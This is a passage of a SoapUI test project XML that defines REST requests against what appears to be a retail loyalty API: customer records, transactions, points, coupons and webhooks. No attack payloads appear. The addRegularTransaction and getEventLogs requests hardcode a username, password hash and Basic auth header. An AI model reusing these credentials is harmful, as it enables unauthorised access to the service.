<?xml version="1.0" encoding="UTF-8"?>
<con:soapui-project id="cb40d130-0486-4f5f-8093-9bd80b5e44b6" activeEnvironment="Default" name="APIsFuzzyTestSetUp" resourceRoot="" soapui-version="5.6.0" abortOnError="false" runType="SEQUENTIAL" defaultScriptLanguage="Groovy" xmlns:con="http://eviware.com/soapui/config">
  <con:settings>
    <con:setting id="com.eviware.soapui.impl.wsdl.actions.iface.tools.support.SecurityTestRunnerAction@values-local"><![CDATA[<xml-fragment xmlns:con="http://eviware.com/soapui/config">
  <con:entry key="Report Format(s)" value=""/>
  <con:entry key="Host:Port" value=""/>
  <con:entry key="Export JUnit Results" value="true"/>
  <con:entry key="Export All" value="true"/>
  <con:entry key="Save After" value="false"/>
  <con:entry key="Add Settings" value="false"/>
  <con:entry key="WSS Password Type" value=""/>
  <con:entry key="TestSuite" value="customer_add TestSuite"/>
  <con:entry key="Endpoint" value=""/>
  <con:entry key="Select Report Type" value=""/>
  <con:entry key="System Properties" value=""/>
  <con:entry key="Password" value=""/>
  <con:entry key="Print Report" value="true"/>
  <con:entry key="Open Report" value="false"/>
  <con:entry key="SecurityTest" value="SecurityTest"/>
  <con:entry key="Global Properties" value=""/>
  <con:entry key="Project Properties" value=""/>
  <con:entry key="SecurityTestRunner Path" value=""/>
  <con:entry key="Project Password" value=""/>
  <con:entry key="TestCase" value="addTestCase"/>
  <con:entry key="Username" value=""/>
  <con:entry key="user-settings.xml Password" value=""/>
  <con:entry key="Environment" value="Default"/>
  <con:entry key="Coverage Report" value="false"/>
  <con:entry key="Enable UI" value="false"/>
  <con:entry key="Root Folder" value=""/>
  <con:entry key="Ignore Errors" value="false"/>
  <con:entry key="Domain" value=""/>
  <con:entry key="Tool Args" value=""/>
  <con:entry key="Save Project" value="false"/>
</xml-fragment>]]></con:setting>
  </con:settings>
  <con:interface xsi:type="con:RestService" id="f83c5208-a573-4edc-b9ee-e1dbc68b757a" wadlVersion="http://wadl.dev.java.net/2009/02" name="customer_add" type="rest" definitionUrl="http" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
      <con:endpoint>https://nightly.capillary.in</con:endpoint>
    </con:endpoints>
    <con:resource name="add" path="/{version}/customer/add" id="962fdae1-7460-4dac-92cd-004cf38d476e">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>version</con:name>
          <con:value>version</con:value>
          <con:style>TEMPLATE</con:style>
          <con:default>version</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>{format}</con:value>
          <con:style>QUERY</con:style>
          <con:default>{format}</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="4b908cfb-b824-41e5-bec9-c1a7718b59d8" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="6b3f46be-1a90-4d61-9862-329d83eba9bd" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment xmlns:con="http://eviware.com/soapui/config">
  &lt;con:entry key="X-CAP-CLIENT-COUNTRYCODE" value="1"/>
  &lt;con:entry key="Content-Type" value="application/json"/>
&lt;/xml-fragment></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request>{
  "root": {
    "customer": [
      {
        "mobile": "6706295457",
        "email": "6706295457@gmail.com",

        "firstname": "ng_test",
        "lastname": "g_test",
        "gender": "F",
        "subscriptions": {
          "subscription": [
            {
              "priority": "TRANS",
              "scope": "all",
              "is_subscribed": "0",
              "channel": "email"
            },
            {
              "priority": "BULK",
              "scope": "all",
              "is_subscribed": "0",
              "channel": "email"
            },
            {
              "priority": "TRANS",
              "scope": "all",
              "is_subscribed": "0",
              "channel": "sms"
            },
            {
              "priority": "BULK",
              "scope": "all",
              "is_subscribed": "0",
              "channel": "sms"
            }
          ]
        },
        	"extended_fields": {
				"field": [{
						"name": "nationality",
						"value": "India"
					},
					{
						"name": "zip",
						"value": "122001"
					}
				]
			},
        "custom_fields": {
          "field": [
            {
              "name": "Hobbies",
              "value": "[“Fitness”]"
            },
            {
              "name": "a",
              "value": "[“b”]"
            }
          ]
        }

      }
    ]
  }
}</con:request>
          <con:originalUri>https://nightly.capillary.in/v1.1/customer/add</con:originalUri>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters>
            <con:entry key="format" value="json"/>
            <con:entry key="version" value="v1.1"/>
          </con:parameters>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="e04fff62-3e0e-4387-8dfd-0b7ac5b37a3c" wadlVersion="http://wadl.dev.java.net/2009/02" name="getEventLogs" type="rest" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT" rootPart=""/>
    <con:endpoints>
      <con:endpoint>http://nightly.capillary.in</con:endpoint>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="{req_id}" path="/{version}/webHooks/eventLog/requestId/{request_id}" id="f75ff369-9710-4e54-b790-297750bfb3bd">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>version</con:name>
          <con:value>v3</con:value>
          <con:style>TEMPLATE</con:style>
          <con:default>v3</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>request_id</con:name>
          <con:value/>
          <con:style>TEMPLATE</con:style>
          <con:default/>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="f9db9900-9406-472a-8d8c-0eaf603590c1" method="GET">
        <con:settings/>
        <con:parameters/>
        <con:representation type="FAULT">
          <con:mediaType>application/json;charset=ISO-8859-1</con:mediaType>
          <con:status>401</con:status>
          <con:params/>
          <con:element xmlns:d0b="https://nightly.capillary.in/v3/webHooks/eventLog/requestId/d0b07a50-3efb-4c16-b395-45b49fb37ffa">d0b:Fault</con:element>
        </con:representation>
        <con:representation type="RESPONSE">
          <con:mediaType>application/json;charset=UTF-8</con:mediaType>
          <con:status>200</con:status>
          <con:params/>
          <con:element xmlns:d0b="https://nightly.capillary.in/v3/webHooks/eventLog/requestId/d0b07a50-3efb-4c16-b395-45b49fb37ffa">d0b:Response</con:element>
        </con:representation>
        <con:representation type="FAULT">
          <con:mediaType>application/json</con:mediaType>
          <con:status>404</con:status>
          <con:params/>
          <con:element xmlns:d0b="https://nightly.capillary.in/v3/webHooks/eventLog/requestId/d0b07a50-3efb-4c16-b395-45b49fb37ffa">d0b:Fault</con:element>
        </con:representation>
        <con:request name="Request 1" id="c3c5f177-ed07-4079-aa2d-e3b654c037ab" mediaType="application/json">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Basic Y20uMToyMDJjYjk2MmFjNTkwNzViOTY0YjA3MTUyZDIzNGI3MA==" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request/>
          <con:originalUri>https://nightly.capillary.in/v3/webHooks/eventLog/requestId/d0b07a50-3efb-4c16-b395-45b49fb37ffa</con:originalUri>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters>
            <con:entry key="version" value="v3"/>
            <con:entry key="request_id" value=""/>
          </con:parameters>
          <con:parameterOrder>
            <con:entry>version</con:entry>
            <con:entry>request_id</con:entry>
          </con:parameterOrder>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="356e75ca-0be2-4ebd-b5dd-fd47a09c8647" wadlVersion="http://wadl.dev.java.net/2009/02" name="webhook" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache/>
    <con:endpoints>
      <con:endpoint>http://${#Project#webhook_workspace}</con:endpoint>
      <con:endpoint>http://enqovte5kgmv6a1.m.pipedream.net/</con:endpoint>
    </con:endpoints>
    <con:resource name="events" path="/api/events" id="016d33c5-439b-45fa-a767-71ab5a57370b">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>request_id</con:name>
          <con:value>9f54fb7a-aa1d-430d-a1b3-d5dca350fd29</con:value>
          <con:style>QUERY</con:style>
          <con:default>9f54fb7a-aa1d-430d-a1b3-d5dca350fd29</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="74e87b38-4211-4367-8ebf-50a19028d74b" method="GET">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="34ead1d1-1594-4ef4-9ce9-40c691346b9e" mediaType="application/json">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment xmlns:con="http://eviware.com/soapui/config">
  &lt;con:entry key="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"/>
  &lt;con:entry key="User-Agent" value="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"/>
&lt;/xml-fragment></con:setting>
          </con:settings>
          <con:endpoint>http://${#Project#webhook_workspace}</con:endpoint>
          <con:request/>
          <con:originalUri>https://enlvdydwm08ks.x.pipedream.net/api/events</con:originalUri>
          <con:credentials>
            <con:authType>No Authorization</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="3212de9c-e2cb-49ed-9b76-075cbc718ca7" wadlVersion="http://wadl.dev.java.net/2009/02" name="getWebhooks" type="rest" definitionUrl="http" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="webHooks" path="/{version}/webHooks" id="0e2aa914-1d7d-478d-a249-2ce7557bf37d">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>version</con:name>
          <con:value>version</con:value>
          <con:style>TEMPLATE</con:style>
          <con:default>version</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="c466a5b3-508f-4df5-9b1a-100b5435fc49" method="GET">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="e34c812d-806e-498b-adbd-323081eda9a6" mediaType="application/json">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Content-Type" value="application/json" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request/>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="3d786918-f43a-4f2b-bc6e-f1345cc7752c" wadlVersion="http://wadl.dev.java.net/2009/02" name="getCustomerV2" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="{user_id}" path="/v2/customers/{user_id}" id="2e7ea798-f565-4a0e-956f-4f6b84ee913a">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>user_id</con:name>
          <con:value>user_id</con:value>
          <con:style>TEMPLATE</con:style>
          <con:default>user_id</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>source</con:name>
          <con:value>ALL</con:value>
          <con:style>QUERY</con:style>
          <con:default>ALL</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>accountId</con:name>
          <con:value/>
          <con:style>QUERY</con:style>
          <con:default/>
        </con:parameter>
        <con:parameter>
          <con:name>embed</con:name>
          <con:value>mlp</con:value>
          <con:style>QUERY</con:style>
          <con:default>mlp</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="8d8691dc-6a53-48c4-8c2c-bcaf4d7bf7ee" method="GET">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="35a353eb-1756-4e37-83f8-d8c4a290f0aa" mediaType="application/json">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Content-Type" value="application/json" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request/>
          <con:originalUri>https://nightly.capillary.in/v2/customers/376790377</con:originalUri>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters>
            <entry key="user_id" value="376790377" xmlns="http://eviware.com/soapui/config"/>
          </con:parameters>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="0568445a-36d0-42b5-9933-89df50b53456" wadlVersion="http://wadl.dev.java.net/2009/02" name="addRegularTransaction" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="add" path="/v1.1/transaction/add" id="dee9310e-99b0-48cf-acb7-ec04400c84c4">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>json</con:value>
          <con:style>QUERY</con:style>
          <con:default>json</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="7d818094-4183-4839-b179-0eab76edf758" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="30d7b033-bada-4cf6-abdf-781b858869dc" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Content-Type" value="application/json" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request>{
	"root": {
		"transaction": {
			"bill_client_id": "1121888",
			"type": "regular",
			"number": "BILL_6935391507",
			"notes": "2 lin1e items",
			"amount" : 50000,
			"gross_amount": "100",
			"discount": "10",
			"customer": {
				"mobile": "6935391507",
				"email": "6935391507@gmail.com",
				"external_id": "x6935391507",
				"firstname": "Nayan",
				"lastname": "Gaur"
			},
			"extended_fields": {
				"field": [{
						"name": "ship_first_name",
						"value": "Nayan"
					},
					{
						"name": "ship_last_name",
						"value": "Gaur"
					}
				]
			},
			"payment_details": {
				"payment": [{
						"mode": "CASH",
						"value": "100"
					},
					{
						"mode": [
							"CREDIT",
							"CHECKAPI"
						],
						"value": [
							"4000",
							"500"
						],
						"attributes": {
							"attribute": [{
									"name": "BankNameAPI",
									"value": "value_602656"
								},
								{
									"name": "branch_nameAPI",
									"value": "value_602656"
								}
							]
						},
						"notes": "notes_602656"
					}
				]
			},
			"custom_fields": {

				"field": [{
						"name": "bankdetails",
						"value": "SBI"
					},
					{
						"name": "bankdetails",
						"value": "SBI"
					}
				]

			},
			"line_items": {
				"line_item": [{
						"extended_fields": {
							"field": [{
									"name": "MetalRate",
									"value": 23
								},
								{
									"name": "service_tax_amount",
									"value": 100
								}
							]
						},
						"serial": "1",
						"amount": "500",
						"description": "soap",
						"item_code": "item-001",
						"qty": "50",
						"rate": "10",
						"value": "500",
						"attributes": {
							"attribute": {
								"name": "brand",
								"value": "Levis"
							}
						}
					},
					{
						"extended_fields": {
							"field": [{
									"name": "DesignCode",
									"value": "jmh6677"
								},
								{
									"name": "SupplierCode",
									"value": "hgjy111"
								}
							]
						},
						"serial": "2",
						"amount": "500",
						"description": "soap",
						"item_code": "item-001",
						"qty": "50",
						"rate": "10",
						"value": "500",
						"transaction_number": "niBill1",
						"attributes": {
							"attribute": {
								"name": "brand",
								"value": "Levis"
							}
						}
					},
					{
						"extended_fields": {
							"field": [{
									"name": "StoneCharge",
									"value": 22
								},
								{
									"name": "MakingCharge",
									"value": 11
								}
							]
						},
						"serial": "3",
						"item_code": "t122",
						"description": "afvdfvd",
						"qty": "3",
						"rate": "1000",
						"value": "3000",
						"discount_value": "100",
						"amount": "2900",
						"cashier_id": "cash1233",
						"type": "return",
						"return_type": "LINE_ITEM",
						"transaction_number": "previousBill1"
					}
				]
			},
			"associate_details": {
				"code": "hiraxdhara",
				"name": "Tom Sawyer"
			}
		}
	}
}</con:request>
          <con:originalUri>https://nightly.capillary.in/v1.1/transaction/add</con:originalUri>
          <con:credentials>
            <con:username>cm.1</con:username>
            <con:password>202cb962ac59075b964b07152d234b70</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="9188fa72-d4ca-4799-b0ec-81d98303a349" wadlVersion="http://wadl.dev.java.net/2009/02" name="isRedeemable" type="rest" definitionUrl="http" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="isredeemable" path="/{version}/points/isredeemable" id="fd2cf47e-cfde-48da-8593-244b9da11944">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>version</con:name>
          <con:value>version</con:value>
          <con:style>TEMPLATE</con:style>
          <con:default>version</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>json</con:value>
          <con:style>QUERY</con:style>
          <con:default>json</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>points</con:name>
          <con:value>{points}</con:value>
          <con:style>QUERY</con:style>
          <con:default>{points}</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>skip_validation</con:name>
          <con:value>true</con:value>
          <con:style>QUERY</con:style>
          <con:default>true</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>mobile</con:name>
          <con:value>{mobile}</con:value>
          <con:style>QUERY</con:style>
          <con:default>{mobile}</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>program_id</con:name>
          <con:style>QUERY</con:style>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="d951de00-4eb0-48cb-b9c6-a53e5d8c10d2" method="GET">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="7324ca5d-555c-46eb-892f-02a744545f27" mediaType="application/json">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Content-type" value="application/json" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request/>
          <con:originalUri>https://nightly.capillary.in/version/points/isredeemable</con:originalUri>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters>
            <con:entry key="mobile" value="7456470100"/>
            <con:entry key="version" value="v1.1"/>
            <con:entry key="points" value="50"/>
          </con:parameters>
          <con:parameterOrder>
            <con:entry>version</con:entry>
            <con:entry>format</con:entry>
            <con:entry>points</con:entry>
            <con:entry>skip_validation</con:entry>
            <con:entry>mobile</con:entry>
            <con:entry>program_id</con:entry>
          </con:parameterOrder>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="01393347-1433-435e-8d4d-c02b4f1ad97c" wadlVersion="http://wadl.dev.java.net/2009/02" name="RedeemPoints" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="redeem" path="/{version}/points/redeem" id="8778912a-bb63-423f-abdb-89c51359fb8a">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>version</con:name>
          <con:value>version</con:value>
          <con:style>TEMPLATE</con:style>
          <con:default>version</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>json</con:value>
          <con:style>QUERY</con:style>
          <con:default>json</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>program_id</con:name>
          <con:value>{program_id}</con:value>
          <con:style>QUERY</con:style>
          <con:default>{program_id}</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="68dcceb8-9b58-4693-aee2-f6c101bb4f24" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="0c6d7d87-8bdb-450b-b683-a4bcddcec72c" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request>{
  "root": {
    "redeem": {
      "points_redeemed": "50",
      "transaction_number": "1234r743",
      "customer": { "mobile": "91712292522" },
      "notes": "Sample notes",
      "validation_code": "7S8VH7"
    }
  }
}</con:request>
          <con:credentials>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters>
            <con:entry key="program_id" value="1231"/>
            <con:entry key="version" value="v1.1"/>
          </con:parameters>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="1486e61e-cd35-4606-b74b-5c6406abb01d" wadlVersion="http://wadl.dev.java.net/2009/02" name="getCustomerV1" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="get" path="/v1.1/customer/get" id="5e983fb5-e4dc-456e-bead-4a470764829c">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>json</con:value>
          <con:style>QUERY</con:style>
          <con:default>json</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>id</con:name>
          <con:value>{user_id}</con:value>
          <con:style>QUERY</con:style>
          <con:default>{user_id}</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>mlp</con:name>
          <con:value>true</con:value>
          <con:style>QUERY</con:style>
          <con:default>true</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="700e2ddf-a659-4042-8dd9-8df792a13bc5" method="GET">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="fffb4960-10e1-4ff0-982b-f7255dbe25c3" mediaType="application/json">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="X-CAP-CLIENT-COUNTRYCODE" value="1" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request/>
          <con:originalUri>https://nightly.capillary.in/v1.1/customer/get</con:originalUri>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters>
            <entry key="id" value="378087418" xmlns="http://eviware.com/soapui/config"/>
          </con:parameters>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="fcc704d4-06ce-4de6-a1d4-738180ea26c5" wadlVersion="http://wadl.dev.java.net/2009/02" name="issueCoupon" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="issue" path="/v1.1/coupon/issue" id="9f92e04a-5c5b-45d0-9712-e7ddabfa844a">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>user_id</con:name>
          <con:value>true</con:value>
          <con:style>QUERY</con:style>
          <con:default>true</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>json</con:value>
          <con:style>QUERY</con:style>
          <con:default>json</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="e262157b-ca9f-474a-989a-793e74b49680" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="757eb83a-f2f8-4b87-82bf-8545223dbbc2" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request>{
   "root":{
      "coupon":[
         {
            "series_id":87618,
            "customer":{
               "mobile":"919090080344",
               "external_id":null,
               "email":null
            }
         }
      ]
   }
}</con:request>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="f5fc346f-3e9a-4165-8448-f6ce2cb69fdc" wadlVersion="http://wadl.dev.java.net/2009/02" name="RedeemCoupon" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="redeem" path="/v1.1/coupon/redeem" id="3c7e403a-9272-4ba1-8b24-5b3368163cea">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>json</con:value>
          <con:style>QUERY</con:style>
          <con:default>json</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="84d1ca8a-673f-4398-becf-64469fbc920f" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="ff5fa5db-d484-4866-bf48-2ed0a1b8e3c1" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request>{
  "root": {
    "coupon": [{
      "code": "{{code}}",
      "redemption_time": "2017-09-17",
      "customer": {
        "mobile": "{{mobile1}}"
      },
      "custom_fields": {
        "field": {
          "name": "Sport",
          "value": "[“Soccer”]"
        }
      },
      "transaction": {
        "number":"{{billNumber}}",
        "amount": "1000"
      }
    }]
  }
}</con:request>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
